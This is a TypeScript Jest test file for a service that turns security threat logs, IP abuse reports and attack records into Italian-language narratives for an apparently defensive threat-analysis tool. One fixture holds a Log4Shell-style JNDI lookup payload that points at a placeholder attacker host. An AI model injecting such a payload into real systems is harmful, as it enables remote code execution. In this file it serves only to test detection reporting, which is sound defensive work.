import 'reflect-metadata';
import { container } from 'tsyringe';
import mongoose from 'mongoose';
import { RagTranslationService } from '../RagTranslationService';
import { LOGGER_TOKEN } from '../../../di/tokens';
import ThreatLog from '../../../models/ThreatLogSchema';
import IpDetails from '../../../models/IpDetailsSchema';
import AbuseIpDb from '../../../models/AbuseIpDbSchema';
import AbuseReport from '../../../models/AbuseReportSchema';
import { performance } from 'perf_hooks';

describe('RagTranslationService Unit Test', () => {
    let service: RagTranslationService;
    let mockLogger: any;

    beforeEach(() => {
        container.reset();
        mockLogger = {
            info: jest.fn(),
            error: jest.fn(),
            warn: jest.fn(),
            debug: jest.fn()
        };
        container.registerInstance(LOGGER_TOKEN, mockLogger);
        service = container.resolve(RagTranslationService);
    });

    describe('Performance and Efficiency', () => {
        it('should translate 1000 logs in less than 500ms (Efficiency Test)', () => {
            const mockLog = {
                timestamp: new Date(),
                request: { ip: '1.2.3.4', method: 'GET' },
                protocol: 'http',
                fingerprint: { score: 50, suspicious: true }
            };

            const start = performance.now();
            for (let i = 0; i < 1000; i++) {
                service.translateThreatLog(mockLog as any);
            }
            const end = performance.now();
            const duration = end - start;

            console.log(`[PERF] Traduzione di 1000 ThreatLog completata in: ${duration.toFixed(2)}ms`);
            expect(duration).toBeLessThan(500);
        });
    });

    describe('Effectiveness (Correctness of Narrative)', () => {
        it('should correctly translate a complex ThreatLog with JNDI payload', () => {
            const log = {
                timestamp: new Date('2026-05-01T12:00:00Z'),
                request: { 
                    ip: '1.2.3.4', 
                    method: 'POST', 
                    jndiPayload: '${jndi:ldap://attacker.com/a}' 
                },
                protocol: 'http',
                geo: { country: 'Russia', city: 'Moscow', isp: 'Evil ISP' },
                fingerprint: { score: 85, suspicious: true, indicators: ['JNDI_DETECTED', 'TOR_EXIT'] }
            };

            const narrative = service.translateThreatLog(log as any);

            expect(narrative).toContain('1.2.3.4');
            expect(narrative).toContain('Russia');
            expect(narrative).toContain('85/100');
            expect(narrative).toContain('payload JNDI malevolo');
            expect(narrative).toContain('JNDI_DETECTED, TOR_EXIT');
            expect(narrative).toContain('sospetta');
        });

        it('should correctly translate IpDetails with AbuseData and filtered comments', () => {
            const ipDetails = {
                ip: '8.8.8.8',
                firstSeenAt: new Date('2026-01-01T00:00:00Z'),
                lastSeenAt: new Date('2026-05-01T00:00:00Z'),
                ipinfo: { org: 'Google LLC' }
            };

            const abuseData = {
                abuseConfidenceScore: 95,
                totalReports: 150,
                isTor: true
            };

            const abuseReports = [
                { comment: 'Fail2Ban ban triggered for sshd', reportedAt: new Date() }, // Spam - should be filtered
                { comment: 'Attempting to access .env files via web', reportedAt: new Date() }, // Semantic - keep
                { comment: 'SSH bruteforce attack detected', reportedAt: new Date() }, // Semantic - keep
                { comment: 'bad ip', reportedAt: new Date() }, // Too short - filter
                { comment: 'Port scan detected by honeypot', reportedAt: new Date() } // Spam - filter
            ];

            const narrative = service.translateIpDetails(ipDetails as any, abuseData as any, abuseReports as any);

            expect(narrative).toContain('8.8.8.8');
            expect(narrative).toContain('Google LLC');
            expect(narrative).toContain('95/100');
            expect(narrative).toContain('nodo di uscita TOR');
            
            // Verifica filtri semantici
            expect(narrative).toContain('.env files');
            expect(narrative).toContain('SSH bruteforce');
            
            // Verifica che lo spam sia stato rimosso
            expect(narrative).not.toContain('Fail2Ban');
            expect(narrative).not.toContain('bad ip');
            expect(narrative).not.toContain('Port scan');
        });
    });

    describe('Attack Translation', () => {
        it('should translate an AttackDTO with enriched context', () => {
            const attack = {
                ip: '10.20.30.40',
                dangerLevel: 2,
                intensityAttack: 'burst persistente',
                firstSeen: '2026-05-01T10:00:00Z',
                lastSeen: '2026-05-01T11:00:00Z',
                attackDurationMinutes: 60,
                durataAttacco: { human: '1 ora' },
                totaleLogs: 500,
                averageScore: 75.5,
                attackPatterns: ['SQL Injection', 'Path Traversal'],
                protocol: 'http',
                ipDetails: {
                    ipinfo: { org: 'Amazon Data Services' }
                },
                fingerprintAnalysis: { isTool: true },
                sequenceAnalysis: { bruteForceSuccess: true, lateralMovement: true },
                payloadRiskScore: 90,
                request: { url: '/admin/login' }
            };

            const narrative = service.translateAttack(attack as any);

            expect(narrative).toContain('10.20.30.40');
            expect(narrative).toContain('Alto'); // Danger Level 2
            expect(narrative).toContain('burst persistente');
            expect(narrative).toContain('1 ora');
            expect(narrative).toContain('500 richieste');
            expect(narrative).toContain('protocollo http');
            expect(narrative).toContain('Amazon Data Services');
            expect(narrative).toContain('strumento automatizzato');
            expect(narrative).toContain('successo in un attacco brute-force');
            expect(narrative).toContain('movimento laterale');
            expect(narrative).toContain('rischio associato ai payload inviati è estremamente elevato');
            expect(narrative).toContain('/admin/login');
        });

        it('should handle missing fields in AttackDTO gracefully', () => {
            const minimalAttack = {
                ip: '5.6.7.8',
                firstSeen: '2026-05-01T10:00:00Z',
                lastSeen: '2026-05-01T10:05:00Z',
                totaleLogs: 10
            };

            const narrative = service.translateAttack(minimalAttack as any);

            expect(narrative).toContain('5.6.7.8');
            expect(narrative).toContain('non classificato');
            expect(narrative).toContain('protocollo N/A');
            expect(narrative).toContain('ISP sconosciuto');
            expect(narrative).not.toContain('strumento automatizzato');
        });
    });

    describe('Generative Prompt Builder', () => {
        it('should build a valid prompt for campaign summarization', () => {
            const campaignData = {
                campaignId: 'CMP-001',
                ipCount: 12,
                topIps: ['1.1.1.1', '2.2.2.2'],
                protocols: ['ssh']
            };

            const prompt = service.buildCampaignSummaryPrompt(campaignData);

            expect(prompt).toContain('Campagna di Attacco Distribuita');
            expect(prompt).toContain('CMP-001');
            expect(prompt).toContain('12');
            expect(prompt).toContain('--- INIZIO DATI JSON DELLA CAMPAGNA ---');
        });
    });
});
